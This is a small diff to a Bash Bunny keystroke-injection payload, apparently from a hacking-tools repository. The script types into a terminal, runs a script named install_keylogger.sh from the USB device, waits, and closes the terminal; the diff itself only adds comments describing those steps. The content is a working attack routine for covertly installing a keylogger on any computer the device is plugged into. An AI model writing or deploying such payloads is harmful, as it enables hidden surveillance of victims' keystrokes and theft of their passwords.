@@ -9,8 +9,12 @@ QUACK DELAY 500
 QUACK STRING Terminal
 QUACK ENTER
 QUACK DELAY 1000
+
+# run the keylogger installer
 QUACK STRING bash "/media/bbpwn2/BashBunny/payloads/switch1/install_keylogger.sh" 
 QUACK ENTER
+
+# wait five seconds, then exit the terminal
 QUACK DELAY 5000
 QUACK STRING exit
 QUACK ENTER
